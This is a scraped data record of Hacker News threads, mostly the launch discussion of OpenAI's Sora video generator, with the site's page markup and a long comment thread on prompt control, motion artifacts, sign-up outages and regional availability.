single human mind it's possible to have radically groundbreaking thoughts in one domain, and simultaneously be a total crack-pot in another. Linus Pauling and the vitamin C thing comes to mind. There's no such thing as an average person! I guess we'll see what the quantum experts have to say about this in the weeks to come =) reply LampCharger 1 hour agoprevnext [5 more] [flagged] sidcool 1 hour agoparentNice. I like how HN now has AI summary bots. reply LampCharger 1 hour agorootparentnext [4 more] [flagged] aspenmayer 1 hour agorootparentGenerated comments are against HN guidelines. reply yorwba 18 minutes agorootparentNot seeing anything about generated comments in there: https://news.ycombinator.com/newsguidelines.html reply aspenmayer 6 minutes agorootparenthttps://news.ycombinator.com/item?id=42224783 https://hn.algolia.com/?dateRange=all&page=0&prefix=true&que... reply slater 56 minutes agoprev [–] I bet Vimeo videos will still chug on it reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Google has introduced Willow, a quantum chip that marks a significant advancement in quantum error correction and computation speed.- Willow demonstrated its capability by performing a computation in under five minutes, a task that would take a supercomputer 10 septillion years, indicating its potential to tackle complex problems beyond classical computers.- This development is pivotal for the future of commercially viable quantum computers, with implications for revolutionizing industries such as medicine, energy, and artificial intelligence (AI)."
    ],
    "commentSummary": [
      "Google's announcement of the quantum chip, Willow, featuring over 100 qubits with stability, marks a significant milestone in quantum computing.- This development could influence AI and data security, as quantum computing poses challenges to traditional encryption methods.- Despite the achievement, practical applications like Shor's algorithm require a much higher number of qubits, leading to mixed reactions regarding the chip's immediate impact."
    ],
    "points": 209,
    "commentCount": 153,
    "retryCount": 0,
    "time": 1733761703
  },
  {
    "id": 42368604,
    "title": "OpenAI: Sora",
    "originLink": "https://sora.com/",
    "originBody": "(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])self.__next_f.push([1,\"1:HL[\\\"/_next/static/css/f67c436c318f3c6d.css\\\",\\\"style\\\"]\"])self.__next_f.push([1,\"2:I[43518,[],\\\"\\\"]4:I[44611,[],\\\"ClientPageRoot\\\"]5:I[40059,[\\\"792\\\",\\\"static/chunks/84fbfe7f-597bee2a332c7bee.js\\\",\\\"1616\\\",\\\"static/chunks/1616-6540832cbf65582a.js\\\",\\\"2261\\\",\\\"static/chunks/2261-cc899d3530197729.js\\\",\\\"953\\\",\\\"static/chunks/953-bc0b1fbb112e5609.js\\\",\\\"9658\\\",\\\"static/chunks/9658-d0ab47b0ace9f19c.js\\\",\\\"7974\\\",\\\"static/chunks/app/(main)/page-2a89f7fa3c1c6d06.js\\\"],\\\"default\\\",1]7:I[35158,[\\\"792\\\",\\\"static/chunks/84fbfe7f-597bee2a332c7bee.js\\\",\\\"1616\\\",\\\"static/chunks/1616-6540832cbf65582a.js\\\",\\\"2261\\\",\\\"static/chunks/2261-cc899d3530197729.js\\\",\\\"900\\\",\\\"static/chunks/900-4d51429ad5f290eb.js\\\",\\\"953\\\",\\\"static/chunks/953-bc0b1fbb112e5609.js\\\",\\\"9658\\\",\\\"static/chunks/9658-d0ab47b0ace9f19c.js\\\",\\\"4095\\\",\\\"static/chunks/app/(main)/layout-801c3570a63665bf.js\\\"],\\\"default\\\",1]8:I[80120,[],\\\"\\\"]9:I[81949,[],\\\"\\\"]11:I[35754,[],\\\"\\\"]a:[]b:{}c:{\\\"fontFamily\\\":\\\"system-ui,\\\\\\\"Segoe UI\\\\\\\",Roboto,Helvetica,Arial,sans-serif,\\\\\\\"Apple Color Emoji\\\\\\\",\\\\\\\"Segoe UI Emoji\\\\\\\"\\\",\\\"height\\\":\\\"100vh\\\",\\\"textAlign\\\":\\\"center\\\",\\\"display\\\":\\\"flex\\\",\\\"flexDirection\\\":\\\"column\\\",\\\"alignItems\\\":\\\"center\\\",\\\"justifyContent\\\":\\\"center\\\"}d:{\\\"display\\\":\\\"inline-block\\\",\\\"margin\\\":\\\"0 20px 0 0\\\",\\\"padding\\\":\\\"0 23px 0 0\\\",\\\"fontSize\\\":24,\\\"fontWeight\\\":500,\\\"verticalAlign\\\":\\\"top\\\",\\\"lineHeight\\\":\\\"49px\\\"}e:{\\\"display\\\":\\\"inline-block\\\"}f:{\\\"fontSize\\\":14,\\\"fontWeight\\\":400,\\\"lineHeight\\\":\\\"49px\\\",\\\"margin\\\":0}12:[]\"])self.__next_f.push([1,\"0:[\\\"$\\\",\\\"$L2\\\",null,{\\\"buildId\\\":\\\"3lczWfoHlI_9CnTyFDiel\\\",\\\"assetPrefix\\\":\\\"\\\",\\\"urlParts\\\":[\\\"\\\",\\\"\\\"],\\\"initialTree\\\":[\\\"\\\",{\\\"children\\\":[\\\"(main)\\\",{\\\"children\\\":[\\\"__PAGE__\\\",{}],\\\"modalPages\\\":[\\\"__DEFAULT__\\\",{}]}]},\\\"$undefined\\\",\\\"$undefined\\\",true],\\\"initialSeedData\\\":[\\\"\\\",{\\\"children\\\":[\\\"(main)\\\",{\\\"children\\\":[\\\"__PAGE__\\\",{},[[\\\"$L3\\\",[\\\"$\\\",\\\"$L4\\\",null,{\\\"props\\\":{\\\"params\\\":{},\\\"searchParams\\\":{}},\\\"Component\\\":\\\"$5\\\"}],null],null],null],\\\"modalPages\\\":[\\\"__DEFAULT__\\\",{},[[\\\"$6\\\",null,null],null],null]},[[[[\\\"$\\\",\\\"link\\\",\\\"0\\\",{\\\"rel\\\":\\\"stylesheet\\\",\\\"href\\\":\\\"/_next/static/css/f67c436c318f3c6d.css\\\",\\\"precedence\\\":\\\"next\\\",\\\"crossOrigin\\\":\\\"$undefined\\\"}]],[\\\"$\\\",\\\"$L7\\\",null,{\\\"children\\\":[\\\"$\\\",\\\"$L8\\\",null,{\\\"parallelRouterKey\\\":\\\"children\\\",\\\"segmentPath\\\":[\\\"children\\\",\\\"(main)\\\",\\\"children\\\"],\\\"error\\\":\\\"$undefined\\\",\\\"errorStyles\\\":\\\"$undefined\\\",\\\"errorScripts\\\":\\\"$undefined\\\",\\\"template\\\":[\\\"$\\\",\\\"$L9\\\",null,{}],\\\"templateStyles\\\":\\\"$undefined\\\",\\\"templateScripts\\\":\\\"$undefined\\\",\\\"notFound\\\":[[\\\"$\\\",\\\"title\\\",null,{\\\"children\\\":\\\"404: This page could not be found.\\\"}],[\\\"$\\\",\\\"div\\\",null,{\\\"style\\\":{\\\"fontFamily\\\":\\\"system-ui,\\\\\\\"Segoe UI\\\\\\\",Roboto,Helvetica,Arial,sans-serif,\\\\\\\"Apple Color Emoji\\\\\\\",\\\\\\\"Segoe UI Emoji\\\\\\\"\\\",\\\"height\\\":\\\"100vh\\\",\\\"textAlign\\\":\\\"center\\\",\\\"display\\\":\\\"flex\\\",\\\"flexDirection\\\":\\\"column\\\",\\\"alignItems\\\":\\\"center\\\",\\\"justifyContent\\\":\\\"center\\\"},\\\"children\\\":[\\\"$\\\",\\\"div\\\",null,{\\\"children\\\":[[\\\"$\\\",\\\"style\\\",null,{\\\"dangerouslySetInnerHTML\\\":{\\\"__html\\\":\\\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\\\"}}],[\\\"$\\\",\\\"h1\\\",null,{\\\"className\\\":\\\"next-error-h1\\\",\\\"style\\\":{\\\"display\\\":\\\"inline-block\\\",\\\"margin\\\":\\\"0 20px 0 0\\\",\\\"padding\\\":\\\"0 23px 0 0\\\",\\\"fontSize\\\":24,\\\"fontWeight\\\":500,\\\"verticalAlign\\\":\\\"top\\\",\\\"lineHeight\\\":\\\"49px\\\"},\\\"children\\\":\\\"404\\\"}],[\\\"$\\\",\\\"div\\\",null,{\\\"style\\\":{\\\"display\\\":\\\"inline-block\\\"},\\\"children\\\":[\\\"$\\\",\\\"h2\\\",null,{\\\"style\\\":{\\\"fontSize\\\":14,\\\"fontWeight\\\":400,\\\"lineHeight\\\":\\\"49px\\\",\\\"margin\\\":0},\\\"children\\\":\\\"This page could not be found.\\\"}]}]]}]}]],\\\"notFoundStyles\\\":[]}],\\\"modalPages\\\":[\\\"$\\\",\\\"$L8\\\",null,{\\\"parallelRouterKey\\\":\\\"modalPages\\\",\\\"segmentPath\\\":[\\\"children\\\",\\\"(main)\\\",\\\"modalPages\\\"],\\\"error\\\":\\\"$undefined\\\",\\\"errorStyles\\\":\\\"$undefined\\\",\\\"errorScripts\\\":\\\"$undefined\\\",\\\"template\\\":[\\\"$\\\",\\\"$L9\\\",null,{}],\\\"templateStyles\\\":\\\"$undefined\\\",\\\"templateScripts\\\":\\\"$undefined\\\",\\\"notFound\\\":\\\"$undefined\\\",\\\"notFoundStyles\\\":\\\"$a\\\"}],\\\"params\\\":\\\"$b\\\"}]],null],null]},[[null,[\\\"$\\\",\\\"$L8\\\",null,{\\\"parallelRouterKey\\\":\\\"children\\\",\\\"segmentPath\\\":[\\\"children\\\"],\\\"error\\\":\\\"$undefined\\\",\\\"errorStyles\\\":\\\"$undefined\\\",\\\"errorScripts\\\":\\\"$undefined\\\",\\\"template\\\":[\\\"$\\\",\\\"$L9\\\",null,{}],\\\"templateStyles\\\":\\\"$undefined\\\",\\\"templateScripts\\\":\\\"$undefined\\\",\\\"notFound\\\":[[\\\"$\\\",\\\"title\\\",null,{\\\"children\\\":\\\"404: This page could not be found.\\\"}],[\\\"$\\\",\\\"div\\\",null,{\\\"style\\\":\\\"$c\\\",\\\"children\\\":[\\\"$\\\",\\\"div\\\",null,{\\\"children\\\":[[\\\"$\\\",\\\"style\\\",null,{\\\"dangerouslySetInnerHTML\\\":{\\\"__html\\\":\\\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\\\"}}],[\\\"$\\\",\\\"h1\\\",null,{\\\"className\\\":\\\"next-error-h1\\\",\\\"style\\\":\\\"$d\\\",\\\"children\\\":\\\"404\\\"}],[\\\"$\\\",\\\"div\\\",null,{\\\"style\\\":\\\"$e\\\",\\\"children\\\":[\\\"$\\\",\\\"h2\\\",null,{\\\"style\\\":\\\"$f\\\",\\\"children\\\":\\\"This page could not be found.\\\"}]}]]}]}]],\\\"notFoundStyles\\\":[]}]],null],null],\\\"couldBeIntercepted\\\":false,\\\"initialHead\\\":[null,\\\"$L10\\\"],\\\"globalErrorComponent\\\":\\\"$11\\\",\\\"missingSlots\\\":\\\"$W12\\\"}]\"])self.__next_f.push([1,\"10:[[\\\"$\\\",\\\"meta\\\",\\\"0\\\",{\\\"name\\\":\\\"viewport\\\",\\\"content\\\":\\\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\\\"}],[\\\"$\\\",\\\"meta\\\",\\\"1\\\",{\\\"charSet\\\":\\\"utf-8\\\"}],[\\\"$\\\",\\\"meta\\\",\\\"2\\\",{\\\"property\\\":\\\"og:title\\\",\\\"content\\\":\\\"Sora\\\"}],[\\\"$\\\",\\\"meta\\\",\\\"3\\\",{\\\"property\\\":\\\"og:description\\\",\\\"content\\\":\\\"Transform text and images into immersive videos. Animate stories, visualize ideas, and bring your concepts to life.\\\"}],[\\\"$\\\",\\\"meta\\\",\\\"4\\\",{\\\"property\\\":\\\"og:url\\\",\\\"content\\\":\\\"https://sora.com\\\"}],[\\\"$\\\",\\\"meta\\\",\\\"5\\\",{\\\"property\\\":\\\"og:image\\\",\\\"content\\\":\\\"https://cdn.openai.com/sora/images/og-cover-24.jpg\\\"}],[\\\"$\\\",\\\"meta\\\",\\\"6\\\",{\\\"name\\\":\\\"twitter:card\\\",\\\"content\\\":\\\"summary_large_image\\\"}],[\\\"$\\\",\\\"meta\\\",\\\"7\\\",{\\\"name\\\":\\\"twitter:title\\\",\\\"content\\\":\\\"Sora\\\"}],[\\\"$\\\",\\\"meta\\\",\\\"8\\\",{\\\"name\\\":\\\"twitter:description\\\",\\\"content\\\":\\\"Transform text and images into immersive videos. Animate stories, visualize ideas, and bring your concepts to life.\\\"}],[\\\"$\\\",\\\"meta\\\",\\\"9\\\",{\\\"name\\\":\\\"twitter:image\\\",\\\"content\\\":\\\"https://cdn.openai.com/sora/images/og-cover-24.jpg\\\"}]]3:null6:null\"])(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML=\"window.__CF$cv$params={r:'8ef73fc63e20d6b7',t:'MTczMzc3MDk0Mi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);\";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();",
    "commentLink": "https://news.ycombinator.com/item?id=42368604",
    "commentBody": "OpenAI: Sora (sora.com)197 points by toomuchtodo 59 minutes agohidepastfavorite137 comments yeknoda 51 minutes agoI've found using these and similar tools that the amount of prompts and iteration required to create my vision (image or video in my mind) is very large and often is not able to create what I had originally wanted. A way to test this is to take a piece of footage or an image which is the ground truth, and test how much prompting and editing it takes to get the same or similar ground truth starting from scratch. It is basically not possible with the current tech and finite amounts of time and iterations. reply beefnugs 0 minutes agoparentAI isn't trying to sell to you: a precise artist with real vision in your brain. It is selling to managers who want to shit out something in an evening that approximates anything, that writes ads that no one wants to see anyway, that produces surface level examples of how you can pay employees less because \"their job is so easy\" reply jerf 10 minutes agoparentprevIt just plain isn't possible if you mean a prompt the size of what most people have been using lately, in the couple hundred character range. By sheer information theory, the number of possible interpretations of \"a zoom in on a happy dog catching a frisbee\" means that you can not match a particular clip out of the set with just that much text. You will need vastly more content; information about the breed, information about the frisbee, information about the background, information about timing, information about framing, information about lighting, and so on and so forth. Right now the AIs can't do that, which is to say, even if you sit there and type a prompt containing all that information, it is going to be forced to ignore most of the result. Under the hood, with the way the text is turned into vector embeddings, it's fairly questionable whether you'd agree that it can even represent such a thing. This isn't a matter of human-level AI or superhuman-level AI; it's just straight up impossible. If you want the information to match, it has to be provided. If it isn't there, an AI can fill in the gaps with \"something\" that will make the scene work, but expecting it to fill in the gaps the way you \"want\" even though you gave it no indication of what that is is expecting literal magic. Long term, you'll never have a coherent movie produced by stringing together a series of textual snippets because, again, that's just impossible. Some sort of long-form \"write me a horror movie staring a precocious 22-year old elf in a far-future Ganymede colony with a message about the importance of friendship\" AI that generates a coherent movie of many scenes will have to be doing a lot of some sort of internal communication in an internal language to hold the result together between scenes, because what it takes to hold stuff coherent between scenes is an amount of English text not entirely dissimilar in size from the underlying representation itself. You might as well skip the English middleman and go straight to an embedding not constrained by a human language mapping. reply miltonlost 32 minutes agoparentprevThe adage \"a picture is worth a thousand words\" has the nice corollary \"A thousand words isn't enough to be precise about an image\". Now expand that to movies and games and you can get why this whole generative-AI bubble is going to pop. reply TeMPOraL 8 minutes agorootparent> Now expand that to movies and games and you can get why this whole generative-AI bubble is going to pop. What will save it is that, no matter how picky you are as a creator, your audience will never know what exactly was that you dreamed up, so any half-decent approximation will work. In other words, a corollary to your corollary is, \"Fortunately, you don't need them to be, because no one cares about low-order bits\". Or, as we say in Poland, \"What the eye doesn't see, the heart doesn't mourn.\" reply naasking 1 minute agorootparentI was just going to say this. If you have an artistic vision that you simply must create to the minutest detail, then like any artist, you're in for a lot of manual work. If you are not beholden to a precise vision or maybe just want to create something that sells, these tools will likely be significant productivity multipliers. reply jsheard 3 minutes agorootparentprev> What will save it is that, no matter how picky you are as a creator, your audience will never know what exactly was that you dreamed up, so any half-decent approximation will work. Part of the problem is the \"half decent approximations\" tend towards a clichéd average, the audience won't know that the cyberpunk cityscape you generated isn't exactly what you had it mind, but they will know that it looks like every other AI generated cyberpunk cityscape and mentally file your creation in the slop folder. reply dartos 2 minutes agorootparentprevYour eye sees just about every frame of a film… People may not think they care, but obviously they do. That’s why marvel movies do better than DC ones. People absolutely care about details in their media. reply Al-Khwarizmi 3 minutes agorootparentprevIf you can build a system that can generate engaging games and movies, from an economic (bubble popping or not popping) point of view it's largely irrelevant whether they conform to fine-grained specifications by a human or not. reply throwup238 6 minutes agorootparentprev“A frame is worth a billion rays” The last production I worked on averaged 16 hours per frame for the final rendering. The amount of information encoded in lighting, models, texture, maps, etc is insane. reply GistNoesis 11 minutes agorootparentprev(2020) https://arxiv.org/abs/2010.11929 : an image is worth 16x16 words transformers for image recognition at scale (2021) https://arxiv.org/abs/2103.13915 : An Image is Worth 16x16 Words, What is a Video Worth? (2024) https://arxiv.org/abs/2406.07550 : An Image is Worth 32 Tokens for Reconstruction and Generation reply dartos 1 minute agorootparentThose are indeed 3 papers. reply szundi 22 minutes agorootparentprevComment was probably rather about the 360 degree turning heads etc. reply isoprophlex 32 minutes agoparentprevAnd another thing that irks me: none of these video generators get motion right... Especially anything involving fluid/smoke dynamics, or fast dynamic momements of humans and animals all suffer from the same weird motion artifacts. I can't describe it other than that the fluidity of the movements are completely off. And as all genai video tools I've used are suffering from the same problem, I wonder if this is somehow inherent to the approach & somehow unsolvable with the current model architectures. reply giantrobot 13 minutes agorootparentI think one of the biggest problems is the models are trained on 2D sequences and don't have any understanding of what they're actually seeing. They see some structure of pixels shift in a frame and learn that some 2D structures should shift in a frame over time. They don't actually understand the images are 2D capture of an event that occurred in four dimensions and the thing that's been imaged is under the influence of unimaged forces. I saw a Santa dancing video today and the suspension of disbelief was almost instantly dispelled when the cuffs of his jacket moved erratically. The GenAI was trying to get them to sway with arm movements but because it didn't understand why they would sway it just generated a statistical approximation of swaying. GenAI also definitely doesn't understand 3D structures easily demonstrated by completely incorrect morphological features. Even my dogs understand gravity, if I drop an object they're tracking (food) they know it should hit the ground. They also understand 3D space, if they stand on their back legs they can see over things or get a better perspective. I've yet to see any GenAI that demonstrates even my dogs' level of understanding the physical world. This leaves their output in the uncanny valley. reply benchmarkist 23 minutes agorootparentprevNeural networks use smooth manifolds as their underlying inductive bias so in theory it should be possible to incorporate smooth kinematic and Hamiltonian constraints but I am certain no one at OpenAI actually understands enough of the theory to figure out how to do that. reply david-gpu 13 minutes agorootparent> I am certain no one at OpenAI actually understands enough of the theory to figure out how to do that We would love to learn more about the origin of your certainty. reply benchmarkist 2 minutes agorootparentI don't work there so I'm certain there is no one with enough knowledge to make it work with Hamiltonian constraints because the idea is very obvious but they haven't done it because they don't have the wherewithal to do so. hipadev23 27 minutes agoparentprevReal artists struggle matching vague descriptions of what is in your head too. This is at least quicker? reply staticman2 13 minutes agorootparentReal artists take comic book scripts and turn them into actual comic books every month. They may not match exactly what the writer had in mind, but they are fit for purpose. reply TeMPOraL 5 minutes agorootparent> They may not match exactly what the writer had in mind, but they are fit for purpose. That's what GenAI is doing, too. After all, the audience only sees the final product; they never get know what the writer had in mind. reply janalsncm 23 minutes agorootparentprevThe point is if you are the artist and have something in your head. It’s the same problem with image editing. I am sure you have experienced this. reply mlboss 20 minutes agorootparentSo what I am getting a use-case for brain-computer interface. reply moralestapia 0 minutes agoparentprevStill three-four order of magnitudes cheaper and easier than to produce said video through traditional methods. reply vjerancrnjak 16 minutes agoparentprevYep, I've tried creating sprite motion and character sheets for a video game and it takes quite a long time and is always a bit off. But I wouldn't have been able to do that by myself from scratch. reply minimaxir 35 minutes agoparentprevWay back in the days of GPT-2, there was an expectation that you'd need to cherry-pick atleast 10% of your output to get something usable/coherent. GPT-3 and ChatGPT greatly reduced the need to cherry-pick, for better or for worse. All the generated video startups seem to generate videos with much lower than 10% usable output, without significant human-guided edits. Given the massive amount of compute needed to generate a video relative to hyperoptimized LLMs, the quality issue will handicap gen video for the foreseeable future. reply joe_the_user 12 minutes agorootparentPlus editing text or an image is practical. Video editors typically are used to cut and paste video streams - a video editor can't fix a stream of video that gets motion or anatomy wrong. reply nomel 37 minutes agoparentprevI think inpainting and \"draw the label scene\" type interfaces are the obvious future. Never thought I'd miss GauGAN [1]. https://www.youtube.com/watch?v=uNv7XBngmLY&t=25 reply cube2222 41 minutes agoparentprevAgreed. It’s still much better than what I could do myself without it, though. (Talking about visual generative AI in general) reply JKCalhoun 37 minutes agorootparentYeah, but if I handed you a Maxfield Parrish it would be better than either of us can do — but not what I asked for. I find generative AI frustrating because I know what I want. To this point I have been trying but then ultimately sitting it out — waiting for the one that really works the way I want. reply cube2222 35 minutes agorootparentFor me even if I know what I want, if I’m using gen AI I’m happy to compromise and get good enough (which again, is so much better than I could do otherwise). If you want higher quality/precision, you’ll likely want to ask a professional, and I don’t expect that to change in the near future. reply adamc 13 minutes agorootparentThat limits its value for industries like Hollywood, though, doesn't it? And without that, who exactly is going to pay for this? reply torginus 8 minutes agoparentprevYeah, it almost feels like gambling - 'you're very close, just spend 20 more credits and you might get it right this time!' reply mattigames 33 minutes agoparentprevNot too far in the future you will be able to drag and drop the position of the characters as well as the position of the camera, among other refiment tools. reply danjl 38 minutes agoparentprevGee, you sound just like a Director! Control is the biggest issue for using gen AI for professional video. Much of the way that VFX CG is designed is precisely to enable the controls a Director needs to achieve their vision. Lots of great new UIs are being developed to help with this problem, but they do not allow for the level of control a Director typically wants. Given how much easier and cheaper it is to use gen AI than a building full of VFX artists, I expect that the control demands of a typical Director will be lowered over time and the UIs will get better. We're just not there yet. reply Imnimo 5 minutes agoprevI feel like there is a sweet spot for AI generation of images and videos that I would describe as \"charmingly bad\", like the stuff we got from the old CLIP+VQGAN models. I feel like Sora has jumped past that into the valley of \"unappealingly bad\". reply MyFirstSass 32 minutes agoprevWow this is bad. And by bad i mean worse than leading open source and existing alternatives. Is it me or does it seem like OpenAI revolutionized with both chatGPT and Sora, but they've completely hit the ceiling? Honestly a bit surprised it happened so fast! reply kranke155 28 minutes agoparentSora was not really that big of a revolution, it was just catching up with competitors. I would even say in gen video they are behind right now. reply pawelduda 16 minutes agorootparentWhat is the best model in your opinion right now? reply ElectroNomad 2 minutes agorootparentRunwayML reply tshaddox 16 minutes agoparentprevWhat are the leading alternatives? (Open source or otherwise) reply elorant 3 minutes agorootparentMidJourney (commercial), Standard Diffusion XL reply joe_the_user 18 minutes agoparentprevBad also in the sense once you get over the \"boy, it's amazing they can do that\", you immediately think \"boy, they really shouldn't do that\". reply Banditoz 17 minutes agoparentprevWhat are some of the open source video models? reply ChrisArchitect 35 minutes agoprevLink should be annoucement post: https://openai.com/index/sora-is-here/ reply aspenmayer 16 minutes agoparenthttps://news.ycombinator.com/item?id=42368981 reply throw4321 20 minutes agoprevOne of the problems with a 10-month preannouncement is that the competition is ready to trash the actual announcement. Half an hour in, I already see half a dozen barely-concealed posts ranging from downplays to over-demands to non-user criticism. reply owenpalmer 50 minutes agoprevMKBHD's review of the new Sora release: https://www.youtube.com/watch?v=OY2x0TyKzIQ reply laweijfmvo 48 minutes agoparentLove the callout of them definitely training on his own videos reply awongh 35 minutes agoparentprevInteresting to see how bad the physics/object permanence is. I wonder if combining this with a Genie 2 type model (Google's new \"world model\") would be the next step in refining it's capabilities. reply torginus 3 minutes agorootparentThis feels like computer graphics and the 'screen space' techniques that got introduced in the Xbox 360 generation - reflection, shadows etc. all suffered from the inability to work with off screen information and gave wildly bad answers once off screen info was required. The solution was simple - just maintain the information in world space, and sample for that. But simple does not mean cheap, and it led to a ton of redundant (as in invisible in the final image) having to be kept track of. reply kranke155 29 minutes agorootparentprevUntil these models can figure out physics, it seems to me they will be an interesting toy reply andybak 19 minutes agorootparentThey can figure out a fair bit of physics. It's not a \"no physics\" vs \"physics\" thing. Rather it's a \"flawed and unreliable physics\" thing. It's similar to the LLM hallucination problem. LLMs produce nonsense and untruths - but they are still useful in many domains. reply gzer0 41 minutes agoprevFor the $20/month subscription: you get 50 generations a month. So it is included in your subscription already! Nice. For the Pro $200/month subscription: you get unlimited generations a month (on a slower que). reply ulrischa 14 minutes agoprevIt will not be available in the EU for now. I always feel disadvantaged when I read that sentence reply tacticalturtle 22 minutes agoprevSomething about that image of the spinning coffee cup with sailing ships is giving me severe trypophobia: https://en.m.wikipedia.org/wiki/Trypophobia It’s a like a spider’s eyes… and also not what I would expect a latte to look like. reply rushingcreek 31 minutes agoprevAs there was no mention of an API for either Sora or o1 Pro, I think this launch further marks OpenAI’s transition from an infrastructure company to a product company. reply fosterfriends 5 minutes agoprevAnyone else feeling their servers melt a bit on sora.com? reply ilaksh 4 minutes agoprevThis is actually a different version from what they had before. What they released today is Sora Turbo. reply LeoPanthera 23 minutes agoprevThis seems pretty broken at the moment, I haven't actually managed to create a video, every prompt results in \"There was an unexpected error running this prompt\". reply knicholes 16 minutes agoparentAt least you get to even see the page! I'm seeing \"Sign ups are temporarily unavailable We’re currently experiencing heavy traffic and have temporarily disabled sign ups. We’re working to get them back up shortly so check back soon.\" reply ilaksh 18 minutes agoparentprevI can't even sign up. I assume it's a capacity issue. reply joshstrange 11 minutes agoprevOpenAI is a masterclass in pissing off paying customers. I'm just about ready to cancel my ChatGPT subscription and move fully over to Claude because OpenAI has spit in my face one too many times. I'm tired of announcements of things being available only to find out \"No, they aren't\" or \"It's rolling out slowly\" where \"slowly\" can mean days, weeks, or month (no exaggeration). I'm tired of shit like this: Sign ups are temporarily unavailable We’re currently experiencing heavy traffic and have temporarily disabled sign ups. We’re working to get them back up shortly so check back soon. Sign up? I'm already signed up, I've had a paid account for a year now or so. > We’re releasing it today as a standalone product at Sora.com to ChatGPT Plus and Pro users. No you aren't, you might be rolling it out (see above for what that means) but it's not released, I'm a ChatGPT Plus user and I can't use it. reply EliBullockPapa 2 minutes agoparentI really don't think it's reasonable to expect them to onboard what is likely tens of thousands of sign ups in the first hour. reply toomuchtodo 57 minutes agoprevFrom \"12 Days of OpenAI: Day 3\" https://www.youtube.com/watch?v=2jKVx2vyZOY (live as of this comment) reply bbor 28 minutes agoparentOver now, and pretty short/light on info AFAICT. That said, knowing what we know now about Altman made me physically unable to watch while he engages in sustained eye contact with the camera, so maybe missed something while skimming! On the upside, I'm so glad we have three billionaires cultivating three different cinema-supervillain vibes (Musk, Altman, & Zuckerberg). Much more fresh than the usual \"oil baron\" aesthetic that we know from the gilded age reply chefandy 35 minutes agoprevIf you're looking for video for casual personal projects or fill-ins for vlog posts, or something to make your PowerPoint look neat, this seems like a rad tool. It has a looong way to go before it's taking anyone's movie VFX job. reply natvert 2 minutes agoprevanyone done a comparison with the open-source hunyuanvideoai.com? reply therein 3 minutes agoprevAccount creation not available. Login to see more videos. Classic OpenAI. I don't care, there are so many better alternatives to everything they do. Funny how quickly they have become irrelevant and lost their moat. reply madihaa 20 minutes agoprevAccount creation currently unavailable reply topherjaynes 19 minutes agoparentyea just that that too. Did anyone get in or did they get overwhelemed? reply HaZeust 16 minutes agorootparentDoesn't look like you will. \"We’re currently experiencing heavy traffic and have temporarily disabled sign ups. We’re working to get them back up shortly so check back soon.\" reply pen2l 25 minutes agoprevEvery day that passes I grow fonder of Google's decision to delay or otherwise keep a lot of this under the wraps. The other day I was scrolling down on YouTube shorts and a couple videos invoked an uncanny valley response from me (I think it was a clip of an unrealistically large snake covering some hut) which was somehow fascinating and strange and captivating, and then scrolling down a few more, again I saw something kind of \"unbelievable\"... I saw a comment or two saying it's fake, and upon closer inspection: yeah, there were enough AI'esque artifacts that one could confidently conclude it's fake. We'd known about AI slop permeating Facebook -- usually a Jesus figure made out of unlikely set of things (like shrimp!) and we'd known that it grips eyeballs. And I don't even know in which box to categorize this, in my mind it conjures the image of those people on slot machines, mechanically and soullessly pulling levers because they are addicted. It's just so strange. I can imagine now some of the conversations that might have happened at Google when they choose to keep a lot of innovations related to genAI under the wraps (I'm being charitable here of their motives), and I can't help but agree. And I can't help but be saddened about OpenAI's decisions to unload a lot of this before recognizing the results of unleashing this to humanity, because I'm almost certain it'll be used more for bad things than good things, I'm certain its application on bad things will secure more eyeballs than on good things. reply zlies 10 minutes agoprevIs there information when it will be available in other countries, like Germany for example? reply seydor 5 minutes agopreveven in this mammoths demo, the dust clouds keep popping behind them even after they have moved forward reply neom 26 minutes agoprevIn July I made this 3 minute little content marketing video for Canada Day. Took me about 40 minutes using a combo of midjourney + pika, suno for the music. Honestly I had a lot of fun making it, I can see these tools with be fun for creative teams to hammer out little things for social media and stuff: https://x.com/ascent_hi/status/1807871799302279372 I don't see sora being THAT much better than pika now that I'm trying both, except that it's included in my openai subscription, but I do think people who do discreet parts of the \"modal stack\" are going to be able to compete on their merits (be it pika for vid or suno for music etc) reply talldayo 6 minutes agoparentThe first 15 seconds of that video made me \"nope\" out so hard. I understand the intention - take some text and give it the old Cinema4D particle effect razzle-dazzle. But instead of maintaining motion clarity when the text explodes (the point of the whole effect), it all cascades into nonsense splotches of sand that look like my screen is being consumed by some black ooze. This isn't a slight against you, because you didn't make the effect and only instructed the AI on what you want. But this is exactly what people are afraid of with marketing, and to be absolutely frank I think you will drive off more potential customers than you convert with this stuff. reply adultsthroaway 6 minutes agoprevGenuinely curious who is doing this for adult content? Complaints about Sora's quality and prompt complexity likely not as important to auteur's in that category, especially with ability to load a custom character etc reply minimaxir 1 minute agoparentSora (along with DALL-E 2 well before it) specifically has safeguards against NSFW content. reply petercooper 36 minutes agoprevI wonder what it is about EU and UK law, in particular, that restricts its availability there. Their FAQs don't mention this. If it's about training models on potentially personal information, the GDPR (EU and UK variants) kicks in, but then that hasn't restricted OpenAI's ability to deploy (Chat)GPT there. The same applies to broader copyright regulations around platforms needing to proactively prevent copyright violation, something GPT could also theoretically accomplish. Any (planned) EU-specific regulations don't apply to the UK, so I doubt it's those either. The only thing that leaves, perhaps, is laws around the generation of deepfakes which both the UK and EU have laws about? But then 